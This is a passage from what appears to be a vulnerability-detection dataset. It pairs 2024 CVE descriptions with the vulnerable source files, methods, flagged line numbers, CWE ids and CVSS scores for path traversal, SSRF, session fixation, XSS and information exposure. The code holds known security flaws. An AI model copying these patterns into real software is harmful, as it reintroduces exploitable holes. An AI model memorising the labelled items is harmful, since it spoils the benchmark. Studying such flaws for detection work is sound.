wrap(rt)\n\t\t}\n\t\tk8sMetrics.ctx = ctx\n\t\tk8sMetrics.roundTripper = rt\n\t\treturn &k8sMetrics\n\t}\n\treturn config\n}\n"
        }
      ],
      "method_level": [
        "func AddMetricsTransportWrapper(ctx context.Context, config *rest.Config) *rest.Config {\n\twrap := config.WrapTransport\n\tconfig.WrapTransport = func(rt http.RoundTripper) http.RoundTripper {\n\t\tif wrap != nil {\n\t\t\trt = wrap(rt)\n\t\t}\n\t\tk8sMetrics.ctx = ctx\n\t\tk8sMetrics.roundTripper = rt\n\t\treturn &k8sMetrics\n\t}\n\treturn config\n}"
      ],
      "hunk_level": [
        {
          "line_no": 74,
          "content": "\t\tk8sMetrics.ctx = ctx"
        },
        {
          "line_no": 75,
          "content": "\t\tk8sMetrics.roundTripper = rt"
        },
        {
          "line_no": 76,
          "content": "\t\treturn &k8sMetrics"
        }
      ]
    },
    "cwe": [
      "CWE-1108",
      "CWE-362"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.7,
    "cvss_version": 3.1
  },
  {
    "id": 837,
    "cve": "CVE-2024-5211",
    "description": "A path traversal vulnerability in mintplex-labs/anything-llm allowed a manager to bypass the `normalizePath()` function, intended to defend against path traversal attacks. This vulnerability enables the manager to read, delete, or overwrite the 'anythingllm.db' database file and other files stored in the 'storage' directory, such as internal communication keys and .env secrets. Exploitation of this vulnerability could lead to application compromise, denial of service (DoS) attacks, and unauthorized admin account takeover. The issue stems from improper validation of user-supplied input in the process of setting a custom logo for the app, which can be manipulated to achieve arbitrary file read, deletion, or overwrite, and to execute a DoS attack by deleting critical files required for the application's operation.",
    "vulnerability": {
      "file_level": [
        {
          "name": "collector/utils/files/index.js",
          "content": "const fs = require(\"fs\");\nconst path = require(\"path\");\nconst { MimeDetector } = require(\"./mime\");\n\nfunction isTextType(filepath) {\n  try {\n    if (!fs.existsSync(filepath)) return false;\n    const mimeLib = new MimeDetector();\n    const mime = mimeLib.getType(filepath);\n    if (mimeLib.badMimes.includes(mime)) return false;\n\n    const type = mime.split(\"/\")[0];\n    if (mimeLib.nonTextTypes.includes(type)) return false;\n    return true;\n  } catch {\n    return false;\n  }\n}\n\nfunction trashFile(filepath) {\n  if (!fs.existsSync(filepath)) return;\n\n  try {\n    const isDir = fs.lstatSync(filepath).isDirectory();\n    if (isDir) return;\n  } catch {\n    return;\n  }\n\n  fs.rmSync(filepath);\n  return;\n}\n\nfunction createdDate(filepath) {\n  try {\n    const { birthtimeMs, birthtime } = fs.statSync(filepath);\n    if (birthtimeMs === 0) throw new Error(\"Invalid stat for file!\");\n    return birthtime.toLocaleString();\n  } catch {\n    return \"unknown\";\n  }\n}\n\nfunction writeToServerDocuments(\n  data = {},\n  filename,\n  destinationOverride = null\n) {\n  const destination = destinationOverride\n    ? path.resolve(destinationOverride)\n    : path.resolve(\n        __dirname,\n        \"../../../server/storage/documents/custom-documents\"\n      );\n  if (!fs.existsSync(destination))\n    fs.mkdirSync(destination, { recursive: true });\n  const destinationFilePath = path.resolve(destination, filename) + \".json\";\n\n  fs.writeFileSync(destinationFilePath, JSON.stringify(data, null, 4), {\n    encoding: \"utf-8\",\n  });\n\n  return {\n    ...data,\n    // relative location string that can be passed into the /update-embeddings api\n    // that will work since we know the location exists and since we only allow\n    // 1-level deep folders this will always work. This still works for integrations like GitHub and YouTube.\n    location: destinationFilePath.split(\"/\").slice(-2).join(\"/\"),\n  };\n}\n\n// When required we can wipe the entire collector hotdir and tmp storage in case\n// there were some large file failures that we unable to be removed a reboot will\n// force remove them.\nasync function wipeCollectorStorage() {\n  const cleanHotDir = new Promise((resolve) => {\n    const directory = path.resolve(__dirname, \"../../hotdir\");\n    fs.readdir(directory, (err, files) => {\n      if (err) resolve();\n\n      for (const file of files) {\n        if (file === \"__HOTDIR__.md\") continue;\n        try {\n          fs.rmSync(path.join(directory, file));\n        } catch {}\n      }\n      resolve();\n    });\n  });\n\n  const cleanTmpDir = new Promise((resolve) => {\n    const directory = path.resolve(__dirname, \"../../storage/tmp\");\n    fs.readdir(directory, (err, files) => {\n      if (err) resolve();\n\n      for (const file of files) {\n        if (file === \".placeholder\") continue;\n        try {\n          fs.rmSync(path.join(directory, file));\n        } catch {}\n      }\n      resolve();\n    });\n  });\n\n  await Promise.all([cleanHotDir, cleanTmpDir]);\n  console.log(`Collector hot directory and tmp storage wiped!`);\n  return;\n}\n\n/**\n * Checks if a given path is within another path.\n * @param {string} outer - The outer path (should be resolved).\n * @param {string} inner - The inner path (should be resolved).\n * @returns {boolean} - Returns true if the inner path is within the outer path, false otherwise.\n */\nfunction isWithin(outer, inner) {\n  if (outer === inner) return false;\n  const rel = path.relative(outer, inner);\n  return !rel.startsWith(\"../\") && rel !== \"..\";\n}\n\nfunction normalizePath(filepath = \"\") {\n  const result = path\n    .normalize(filepath.trim())\n    .replace(/^(\\.\\.(\\/|\\\\|$))+/, \"\")\n    .trim();\n  if ([\"..\", \".\", \"/\"].includes(result)) throw new Error(\"Invalid path.\");\n  return result;\n}\n\nmodule.exports = {\n  trashFile,\n  isTextType,\n  createdDate,\n  writeToServerDocuments,\n  wipeCollectorStorage,\n  normalizePath,\n  isWithin,\n};\n"
        }
      ],
      "method_level": [
        "function normalizePath(filepath = \"\") {\n  const result = path\n    .normalize(filepath.trim())\n    .replace(/^(\\.\\.(\\/|\\\\|$))+/, \"\")\n    .trim();\n  if ([\"..\", \".\", \"/\"].includes(result)) throw new Error(\"Invalid path.\");\n  return result;\n}"
      ],
      "hunk_level": [
        {
          "line_no": 125,
          "content": "    .normalize(filepath.trim())"
        }
      ]
    },
    "cwe": [
      "CWE-29"
    ],
    "severity": "HIGH",
    "cvss_score": 7.2,
    "cvss_version": 3.1
  },
  {
    "id": 403,
    "cve": "CVE-2024-27296",
    "description": "Directus is a real-time API and App dashboard for managing SQL database content. Prior to version 10.8.3, the exact Directus version number was being shipped in compiled JS bundles which are accessible without authentication. With this information a malicious attacker can trivially look for known vulnerabilities in Directus core or any of its shipped dependencies in that specific running version. The problem has been resolved in versions 10.8.3 and newer.",
    "vulnerability": {
      "file_level": [
        {
          "name": "app/src/main.ts",
          "content": "/* eslint-disable no-console */\n\nimport { getVueComponentName } from '@/utils/get-vue-component-name';\nimport { createPinia } from 'pinia';\nimport { createHead } from '@unhead/vue';\nimport { createApp } from 'vue';\nimport App from './app.vue';\nimport { registerComponents } from './components/register';\nimport { DIRECTUS_LOGO } from './constants';\nimport { registerDirectives } from './directives/register';\nimport { loadExtensions, registerExtensions } from './extensions';\nimport { i18n } from './lang/';\nimport { router } from './router';\nimport './styles/main.scss';\nimport { registerViews } from './views/register';\n\ninit();\n\nasync function init() {\n\tconst version = __DIRECTUS_VERSION__;\n\n\tconsole.log(DIRECTUS_LOGO);\n\n\tconsole.info(\n\t\t`Hey! Interested in helping build this open-source data management platform?\\nIf so, join our growing team of contributors at: https://directus.chat`,\n\t);\n\n\tif (import.meta.env.DEV) {\n\t\tconsole.info(`%c🐰 Starting Directus v${version}...`, 'color:Green');\n\t} else {\n\t\tconsole.info(`%c🐰 Starting Directus...`, 'color:Green');\n\t}\n\n\tconsole.time('🕓 Application Loaded');\n\n\tconst app = createApp(App);\n\n\tapp.use(i18n);\n\tapp.use(createPinia());\n\tapp.use(createHead());\n\n\tapp.config.errorHandler = (err, vm, info) => {\n\t\tconst source = getVueComponentName(vm);\n\t\tconsole.warn(`[app-${source}-error] ${info}`);\n\t\tconsole.warn(err);\n\t\treturn false;\n\t};\n\n\tregisterDirectives(app);\n\tregisterComponents(app);\n\tregisterViews(app);\n\n\tawait loadExtensions();\n\tregisterExtensions(app);\n\n\t// Add router after loading of extensions to ensure all routes are registered\n\tapp.use(router);\n\n\tapp.mount('#app');\n\n\tconsole.timeEnd('🕓 Application Loaded');\n\n\tconsole.group(`%c✨ Project Information`, 'color:DodgerBlue'); // groupCollapsed\n\n\tif (import.meta.env.DEV) {\n\t\tconsole.info(`%cVersion: v${version}`, 'color:DodgerBlue');\n\t}\n\n\tconsole.info(`%cEnvironment: ${import.meta.env.MODE}`, 'color:DodgerBlue');\n\tconsole.groupEnd();\n\n\t// Prevent the browser from opening files that are dragged on the window\n\twindow.addEventListener('dragover', (e) => e.preventDefault(), false);\n\twindow.addEventListener('drop', (e) => e.preventDefault(), false);\n}\n"
        }
      ],
      "method_level": [
        "init"
      ],
      "hunk_level": [
        {
          "line_no": 20,
          "content": "\tconst version = __DIRECTUS_VERSION__;"
        },
        {
          "line_no": 28,
          "content": "\tif (import.meta.env.DEV) {"
        },
        {
          "line_no": 29,
          "content": "\t\tconsole.info(`%c🐰 Starting Directus v${version}...`, 'color:Green');"
        },
        {
          "line_no": 30,
          "content": "\t} else {"
        },
        {
          "line_no": 31,
          "content": "\t\tconsole.info(`%c🐰 Starting Directus...`, 'color:Green');"
        },
        {
          "line_no": 32,
          "content": "\t}"
        }
      ]
    },
    "cwe": [
      "CWE-200"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.3,
    "cvss_version": 3.1
  },
  {
    "id": 29,
    "cve": "CVE-2024-21642",
    "description": "D-Tale is a visualizer for Pandas data structures. Users hosting versions D-Tale prior to 3.9.0 publicly can be vulnerable to server-side request forgery (SSRF), allowing attackers to access files on the server. Users should upgrade to version 3.9.0, where the `Load From the Web` input is turned off by default. The only workaround for versions earlier than 3.9.0 is to only host D-Tale to trusted users.",
    "vulnerability": {
      "file_level": [
        {
          "name": "dtale/datasets.py",
          "content": "import pandas as pd\nimport requests\nimport zipfile\n\nfrom six import BytesIO\n\n\ndef covid():\n    from dtale.cli.loaders.csv_loader import loader_func as load_csv\n\n    data = load_csv(\n        path=\"https://raw.githubusercontent.com/nytimes/covid-19-data/master/us-states.csv\",\n        parse_dates=[\"date\"],\n    )\n    codes = load_csv(\n        path=\"https://raw.githubusercontent.com/jasonong/List-of-US-States/master/states.csv\"\n    )\n    codes = codes.set_index(\"State\").to_dict()[\"Abbreviation\"]\n    data[\"state_code\"] = data[\"state\"].map(codes)\n    return data, None\n\n\ndef seinfeld():\n    from dtale.cli.loaders.csv_loader import loader_func as load_csv\n\n    episodes = load_csv(\n        path=\"https://github.com/4m4n5/the-seinfeld-chronicles/raw/master/episode_info.csv\"\n    )\n    episodes = episodes[[c for c in episodes.columns if c not in [\"Unnamed: 0\"]]]\n    scripts = load_csv(\n        path=\"https://github.com/4m4n5/the-seinfeld-chronicles/raw/master/scripts.csv\"\n    )\n    scripts = scripts[\n        [c for c in scripts.columns if c not in [\"Unnamed: 0\", \"Season\", \"EpisodeNo\"]]\n    ]\n    return pd.merge(episodes, scripts, how=\"inner\", on=\"SEID\"), None\n\n\ndef load_zip(url):\n    response = requests.get(url)\n    with zipfile.ZipFile(BytesIO(response.content)) as thezip:\n        for zipinfo in thezip.infolist():\n            yield zipinfo.filename, thezip.open(zipinfo.filename)\n\n\ndef simpsons():\n    from dtale.cli.loaders.csv_loader import loader_func as load_csv\n    import dtale.global_state as global_state\n\n    global_state.set_app_settings(dict(max_column_width=100, max_row_height=100))\n    episodes = load_csv(\n        path=\"https://github.com/aschonfeld/dtale-media/raw/master/datasets/simpsons_episodes.csv\"\n    )\n    episodes = episodes.rename(columns={\"id\": \"episode_id\"})\n    episodes.loc[:, \"image_url\"] = episodes[\"image_url\"].apply(\n        lambda x: \"<img src='{}' style='height: auto; width: 100px;' />\".format(x)\n    )\n    _, scripts = next(\n        load_zip(\n            \"https://github.com/aschonfeld/dtale-media/raw/master/datasets/simpsons_script_lines.csv.zip\"\n        )\n    )\n    scripts = pd.read_csv(scripts)\n    df = pd.merge(episodes, scripts, how=\"inner\", on=\"episode_id\")\n    formatting = {\"image_url\": {\"fmt\": {\"html\": True}}}\n    return df, {\"columnFormats\": formatting}\n\n\ndef video_games():\n    _, games = next(\n        load_zip(\n            \"https://github.com/aschonfeld/dtale-media/raw/master/datasets/vgsales.csv.zip\"\n        )\n    )\n    return pd.read_csv(games), None\n\n\ndef movies():\n    _, movies = next(\n        load_zip(\n            \"https://github.com/aschonfeld/dtale-media/raw/master/datasets/IMDb_movies.csv.zip\"\n        )\n    )\n    movies = pd.read_csv(movies)\n    movies.loc[:, \"year\"] = (\n        movies[\"year\"].where(~(movies[\"year\"] == \"TV Movie 2019\"), \"2019\").astype(\"int\")\n    )\n    return movies, None\n\n\ndef time_dataframe():\n    try:\n        from pandas._testing import makeTimeDataFrame\n\n        return makeTimeDataFrame(), None\n    except ImportError:\n        from pandas.util.testing import makeTimeDataFrame\n\n        return makeTimeDataFrame(), None\n"
        }
      ],
      "method_level": [
        "def time_dataframe():\n    try:\n        from pandas._testing import makeTimeDataFrame\n\n        return makeTimeDataFrame(), None\n    except ImportError:\n        from pandas.util.testing import makeTimeDataFrame\n\n        return makeTimeDataFrame(), None"
      ],
      "hunk_level": [
        {
          "line_no": 92,
          "content": "    try:"
        },
        {
          "line_no": 93,
          "content": "        from pandas._testing import makeTimeDataFrame"
        },
        {
          "line_no": 95,
          "content": "        return makeTimeDataFrame(), None"
        },
        {
          "line_no": 96,
          "content": "    except ImportError:"
        },
        {
          "line_no": 97,
          "content": "        from pandas.util.testing import makeTimeDataFrame"
        },
        {
          "line_no": 99,
          "content": "        return makeTimeDataFrame(), None"
        }
      ]
    },
    "cwe": [
      "CWE-918"
    ],
    "severity": "HIGH",
    "cvss_score": 7.5,
    "cvss_version": 3.1
  },
  {
    "id": 121,
    "cve": "CVE-2024-23679",
    "description": "Enonic XP versions less than 7.7.4 are vulnerable to a session fixation issue. An remote and unauthenticated attacker can use prior sessions due to the lack of invalidating session attributes.\n\n",
    "vulnerability": {
      "file_level": [
        {
          "name": "modules/lib/lib-auth/src/main/java/com/enonic/xp/lib/auth/LoginHandler.java",
          "content": "package com.enonic.xp.lib.auth;\n\nimport java.util.Comparator;\nimport java.util.concurrent.Callable;\nimport java.util.function.Supplier;\nimport java.util.stream.Collectors;\n\nimport javax.servlet.http.HttpSession;\n\nimport com.enonic.xp.context.Context;\nimport com.enonic.xp.context.ContextBuilder;\nimport com.enonic.xp.portal.PortalRequest;\nimport com.enonic.xp.script.bean.BeanContext;\nimport com.enonic.xp.script.bean.ScriptBean;\nimport com.enonic.xp.security.IdProvider;\nimport com.enonic.xp.security.IdProviderKey;\nimport com.enonic.xp.security.IdProviders;\nimport com.enonic.xp.security.RoleKeys;\nimport com.enonic.xp.security.SecurityConstants;\nimport com.enonic.xp.security.SecurityService;\nimport com.enonic.xp.security.SystemConstants;\nimport com.enonic.xp.security.User;\nimport com.enonic.xp.security.auth.AuthenticationInfo;\nimport com.enonic.xp.security.auth.EmailPasswordAuthToken;\nimport com.enonic.xp.security.auth.UsernamePasswordAuthToken;\nimport com.enonic.xp.security.auth.VerifiedEmailAuthToken;\nimport com.enonic.xp.security.auth.VerifiedUsernameAuthToken;\nimport com.enonic.xp.session.Session;\n\npublic final class LoginHandler\n    implements ScriptBean\n{\n    private enum Scope\n    {\n        SESSION, REQUEST, NONE\n    }\n\n    private String user;\n\n    private String password;\n\n    private boolean skipAuth;\n\n    private String[] idProvider;\n\n    private Integer sessionTimeout;\n\n    private Scope scope;\n\n    private Supplier<SecurityService> securityService;\n\n    private Supplier<Context> context;\n\n    private Supplier<PortalRequest> portalRequestSupplier;\n\n    public void setUser( final String user )\n    {\n        this.user = user;\n    }\n\n    public void setPassword( final String password )\n    {\n        this.password = password;\n    }\n\n    public void setSkipAuth( final boolean skipAuth )\n    {\n        this.skipAuth = skipAuth;\n    }\n\n    public void setIdProvider( final String[] idProvider )\n    {\n        this.idProvider = idProvider;\n    }\n\n    public void setSessionTimeout( final Integer sessionTimeout )\n    {\n        this.sessionTimeout = sessionTimeout;\n    }\n\n    public void setScope( final String scope )\n    {\n        this.scope = Scope.valueOf( scope );\n    }\n\n    public LoginResultMapper login()\n    {\n        AuthenticationInfo authInfo = noIdProviderSpecified() ? attemptLoginWithAllExistingIdProviders() : attemptLogin();\n\n        if ( authInfo.isAuthenticated() )\n        {\n            switch ( this.scope )\n            {\n                case NONE:\n                    // do nothing\n                    break;\n                case REQUEST:\n                    this.context.get().getLocalScope().setAttribute( authInfo );\n                    break;\n                case SESSION:\n                default:\n                    createSession( authInfo );\n                    break;\n            }\n\n            return new LoginResultMapper( authInfo );\n        }\n        else\n        {\n            return new LoginResultMapper( authInfo, \"Access Denied\" );\n        }\n    }\n\n    private void createSession( final AuthenticationInfo authInfo )\n    {\n        final Session session = this.context.get().getLocalScope().getSession();\n        if ( session != null )\n        {\n            session.setAttribute( authInfo );\n        }\n\n        if ( this.sessionTimeout != null )\n        {\n            setSessionTimeout();\n        }\n    }\n\n    private boolean noIdProviderSpecified()\n    {\n        return this.idProvider == null || this.idProvider.length == 0;\n    }\n\n    private AuthenticationInfo attemptLoginWithAllExistingIdProviders()\n    {\n        final IdProviders idProviders = runAsAuthenticated( this::getSortedIdProviders );\n\n        for ( IdProvider idProvider : idProviders )\n        {\n            final AuthenticationInfo authInfo = authenticate( idProvider.getKey() );\n            if ( ( authInfo != null ) && authInfo.isAuthenticated() )\n            {\n                return authInfo;\n            }\n        }\n\n        return AuthenticationInfo.unAuthenticated();\n    }\n\n    private IdProviders getSortedIdProviders()\n    {\n        IdProviders idProviders = securityService.get().getIdProviders();\n        return IdProviders.from( idProviders.stream().\n            sorted( Comparator.comparing( u -> u.getKey().toString() ) ).\n            collect( Collectors.toList() ) );\n    }\n\n    private AuthenticationInfo attemptLogin()\n    {\n\n        for ( String uStore : idProvider )\n        {\n            final AuthenticationInfo authInfo = authenticate( IdProviderKey.from( uStore ) );\n            if ( ( authInfo != null ) && authInfo.isAuthenticated() )\n            {\n                return authInfo;\n            }\n        }\n\n        return AuthenticationInfo.unAuthenticated();\n    }\n\n    private AuthenticationInfo authenticate( IdProviderKey idProvider )\n    {\n        AuthenticationInfo authInfo = null;\n\n        if ( isValidEmail( this.user ) )\n        {\n            if ( this.skipAuth )\n            {\n                final VerifiedEmailAuthToken verifiedEmailAuthToken = new VerifiedEmailAuthToken();\n                verifiedEmailAuthToken.setEmail( this.user );\n                verifiedEmailAuthToken.setIdProvider( idProvider );\n\n                authInfo = runAsAuthenticated( () -> this.securityService.get().authenticate( verifiedEmailAuthToken ) );\n            }\n            else\n            {\n                final EmailPasswordAuthToken emailAuthToken = new EmailPasswordAuthToken();\n                emailAuthToken.setEmail( this.user );\n                emailAuthToken.setPassword( this.password );\n                emailAuthToken.setIdProvider( idProvider );\n\n                authInfo = runAsAuthenticated( () -> this.securityService.get().authenticate( emailAuthToken ) );\n            }\n        }\n\n        if ( authInfo == null || !authInfo.isAuthenticated() )\n        {\n            if ( this.skipAuth )\n            {\n                final VerifiedUsernameAuthToken usernameAuthToken = new VerifiedUsernameAuthToken();\n                usernameAuthToken.setUsername( this.user );\n                usernameAuthToken.setIdProvider( idProvider );\n\n                authInfo = runAsAuthenticated( () -> this.securityService.get().authenticate( usernameAuthToken ) );\n            }\n            else\n            {\n                final UsernamePasswordAuthToken usernameAuthToken = new UsernamePasswordAuthToken();\n                usernameAuthToken.setUsername( this.user );\n                usernameAuthToken.setPassword( this.password );\n                usernameAuthToken.setIdProvider( idProvider );\n\n                authInfo = runAsAuthenticated( () -> this.securityService.get().authenticate( usernameAuthToken ) );\n            }\n        }\n\n        return authInfo;\n    }\n\n    private <T> T runAsAuthenticated( Callable<T> runnable )\n    {\n        final AuthenticationInfo authInfo = AuthenticationInfo.create().principals( RoleKeys.AUTHENTICATED ).user( User.ANONYMOUS ).build();\n        return ContextBuilder.from( this.context.get() ).\n            authInfo( authInfo ).\n            repositoryId( SystemConstants.SYSTEM_REPO_ID ).\n            branch( SecurityConstants.BRANCH_SECURITY ).build().\n            callWith( runnable );\n    }\n\n    private boolean isValidEmail( final String value )\n    {\n        return value != null && value.chars().filter( ch -> ch == '@' ).count() == 1;\n    }\n\n    private void setSessionTimeout()\n    {\n        final PortalRequest portalRequest = this.portalRequestSupplier.get();\n        if ( portalRequest != null )\n        {\n            final HttpSession httpSession = portalRequest.getRawRequest().getSession();\n            if ( httpSession != null )\n            {\n                httpSession.setMaxInactiveInterval( this.sessionTimeout );\n            }\n        }\n    }\n\n    @Override\n    public void initialize( final BeanContext context )\n    {\n        this.securityService = context.getService( SecurityService.class );\n        this.context = context.getBinding( Context.class );\n        this.portalRequestSupplier = context.getBinding( PortalRequest.class );\n    }\n}\n"
        }
      ],
      "method_level": [
        "private void createSession( final AuthenticationInfo authInfo )\n    {\n        final Session session = this.context.get().getLocalScope().getSession();\n        if ( session != null )\n        {\n            session.setAttribute( authInfo );\n        }\n\n        if ( this.sessionTimeout != null )\n        {\n            setSessionTimeout();\n        }\n    }",
        "private IdProviders getSortedIdProviders()\n    {\n        IdProviders idProviders = securityService.get().getIdProviders();\n        return IdProviders.from( idProviders.stream().\n            sorted( Comparator.comparing( u -> u.getKey().toString() ) ).\n            collect( Collectors.toList() ) );\n    }",
        "private <T> T runAsAuthenticated( Callable<T> runnable )\n    {\n        final AuthenticationInfo authInfo = AuthenticationInfo.create().principals( RoleKeys.AUTHENTICATED ).user( User.ANONYMOUS ).build();\n        return ContextBuilder.from( this.context.get() ).\n            authInfo( authInfo ).\n            repositoryId( SystemConstants.SYSTEM_REPO_ID ).\n            branch( SecurityConstants.BRANCH_SECURITY ).build().\n            callWith( runnable );\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 116,
          "content": "        final Session session = this.context.get().getLocalScope().getSession();"
        },
        {
          "line_no": 119,
          "content": "            session.setAttribute( authInfo );"
        },
        {
          "line_no": 120,
          "content": "        }"
        },
        {
          "line_no": 122,
          "content": "        if ( this.sessionTimeout != null )"
        },
        {
          "line_no": 123,
          "content": "        {"
        },
        {
          "line_no": 124,
          "content": "            setSessionTimeout();"
        },
        {
          "line_no": 152,
          "content": "        return IdProviders.from( idProviders.stream()."
        },
        {
          "line_no": 153,
          "content": "            sorted( Comparator.comparing( u -> u.getKey().toString() ) )."
        },
        {
          "line_no": 154,
          "content": "            collect( Collectors.toList() ) );"
        },
        {
          "line_no": 224,
          "content": "        return ContextBuilder.from( this.context.get() )."
        },
        {
          "line_no": 225,
          "content": "            authInfo( authInfo )."
        },
        {
          "line_no": 226,
          "content": "            repositoryId( SystemConstants.SYSTEM_REPO_ID )."
        },
        {
          "line_no": 227,
          "content": "            branch( SecurityConstants.BRANCH_SECURITY ).build()."
        },
        {
          "line_no": 228,
          "content": "            callWith( runnable );"
        }
      ]
    },
    "cwe": [
      "CWE-384"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.8,
    "cvss_version": 3.1
  },
  {
    "id": 1083,
    "cve": "CVE-2024-21550",
    "description": "SteVe is an open platform that implements different version of the OCPP protocol for Electric Vehicle charge points, acting as a central server for management of registered charge points. Attackers can inject arbitrary HTML and Javascript code via WebSockets leading to persistent Cross-Site Scripting in the SteVe management interface.",
    "vulnerability": {
      "file_level": [
        {
          "name": "src/main/java/de/rwth/idsg/steve/web/validation/ChargeBoxIdValidator.java",
          "content": "/*\n * SteVe - SteckdosenVerwaltung - https://github.com/steve-community/steve\n * Copyright (C) 2013-2024 SteVe Community Team\n * All Rights Reserved.\n *\n * This program is free software: you can redistribute it and/or modify\n * it under the terms of the GNU General Public License as published by\n * the Free Software Foundation, either version 3 of the License, or\n * (at your option) any later version.\n *\n * This program is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n * GNU General Public License for more details.\n *\n * You should have received a copy of the GNU General Public License\n * along with this program.  If not, see <https://www.gnu.org/licenses/>.\n */\npackage de.rwth.idsg.steve.web.validation;\n\nimport jakarta.validation.ConstraintValidator;\nimport jakarta.validation.ConstraintValidatorContext;\nimport java.util.regex.Pattern;\n\n/**\n * @author Sevket Goekay <sevketgokay@gmail.com>\n * @since 21.01.2016\n */\npublic class ChargeBoxIdValidator implements ConstraintValidator<ChargeBoxId, String> {\n\n    private static final String REGEX = \"\\\\S+\";\n    private static final Pattern PATTERN = Pattern.compile(REGEX);\n\n    @Override\n    public void initialize(ChargeBoxId idTag) {\n        // No-op\n    }\n\n    @Override\n    public boolean isValid(String string, ConstraintValidatorContext constraintValidatorContext) {\n        return string == null || PATTERN.matcher(string).matches();\n    }\n}\n"
        }
      ],
      "method_level": [
        "@Override\n    public boolean isValid(String string, ConstraintValidatorContext constraintValidatorContext) {\n        return string == null || PATTERN.matcher(string).matches();\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 41,
          "content": "        return string == null || PATTERN.matcher(string).matches();"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.1,
    "cvss_version": 3.1
  },
  {
    "id": 1033,
    "cve": "CVE-2024-41953",
    "description": "Zitadel is an open source identity management system. ZITADEL uses HTML for emails and renders certain information such as usernames dynamically. That information can be entered by users or administrators. Due to a missing output sanitization, these emails could include malicious code. This may potentially lead to a threat where an attacker, without privileges, could send out altered notifications that are part of the registration processes. An attacker could create a malicious link, where the injected code would be rendered as part of the email. On the user's detail page, the username was also not sanitized and would also render HTML, giving an attacker the same vulnerability. While it was possible to inject HTML including javascript, the execution of such scripts would be prevented by most email clients and the Content Security Policy in Console UI. This vulnerability is fixed in 2.58.1, 2.57.1, 2.56.2, 2.55.5, 2.54.8 2.53.9, and 2.52.3.",
    "vulnerability": {
      "file_level": [
        {
          "name": "internal/notification/templates/templateData.go",
          "content": "package templates\n\nimport (\n\t\"fmt\"\n\t\"html\"\n\n\t\"github.com/zitadel/zitadel/internal/domain\"\n\t\"github.com/zitadel/zitadel/internal/i18n\"\n)\n\nconst (\n\tDefaultFontFamily      = \"-apple-system, BlinkMacSystemFont, Segoe UI, Lato, Arial, Helvetica, sans-serif\"\n\tDefaultFontColor       = \"#22292f\"\n\tDefaultBackgroundColor = \"#fafafa\"\n\tDefaultPrimaryColor    = \"#5282C1\"\n)\n\ntype TemplateData struct {\n\tTitle           string\n\tPreHeader       string\n\tSubject         string\n\tGreeting        string\n\tText            string\n\tURL             string\n\tButtonText      string\n\tPrimaryColor    string\n\tBackgroundColor string\n\tFontColor       string\n\tLogoURL         string\n\tFontURL         string\n\tFontFaceFamily  string\n\tFontFamily      string\n\n\tIncludeFooter bool\n\tFooterText    string\n}\n\nfunc (data *TemplateData) Translate(translator *i18n.Translator, msgType string, args map[string]interface{}, langs ...string) {\n\tdata.Title = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageTitle), args, langs...)\n\tdata.PreHeader = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessagePreHeader), args, langs...)\n\tdata.Subject = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageSubject), args, langs...)\n\tdata.Greeting = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageGreeting), args, langs...)\n\tdata.Text = html.UnescapeString(translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageText), args, langs...))\n\tdata.ButtonText = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageButtonText), args, langs...)\n\t// Footer text is neither included in i18n files nor defaults.yaml\n\tfooterText := fmt.Sprintf(\"%s.%s\", msgType, domain.MessageFooterText)\n\tdata.FooterText = translator.Localize(footerText, args, langs...)\n\t// translator returns the id of the string to be translated if no translation is found for that id\n\t// we'll include the footer if we have a custom non-empty string and if the string doesn't include the\n\t// id of the string that could not be translated example InitCode.Footer\n\tdata.IncludeFooter = len(data.FooterText) > 0 && data.FooterText != footerText\n}\n"
        }
      ],
      "method_level": [
        "func (data *TemplateData) Translate(translator *i18n.Translator, msgType string, args map[string]interface{}, langs ...string) {\n\tdata.Title = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageTitle), args, langs...)\n\tdata.PreHeader = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessagePreHeader), args, langs...)\n\tdata.Subject = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageSubject), args, langs...)\n\tdata.Greeting = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageGreeting), args, langs...)\n\tdata.Text = html.UnescapeString(translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageText), args, langs...))\n\tdata.ButtonText = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageButtonText), args, langs...)\n\t// Footer text is neither included in i18n files nor defaults.yaml\n\tfooterText := fmt.Sprintf(\"%s.%s\", msgType, domain.MessageFooterText)\n\tdata.FooterText = translator.Localize(footerText, args, langs...)\n\t// translator returns the id of the string to be translated if no translation is found for that id\n\t// we'll include the footer if we have a custom non-empty string and if the string doesn't include the\n\t// id of the string that could not be translated example InitCode.Footer\n\tdata.IncludeFooter = len(data.FooterText) > 0 && data.FooterText != footerText\n}"
      ],
      "hunk_level": [
        {
          "line_no": 43,
          "content": "\tdata.Text = html.UnescapeString(translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageText), args, langs...))"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 4.3,
    "cvss_version": 3.1
  },
  {
    "id": 955,
    "cve": "CVE-2024-39698",
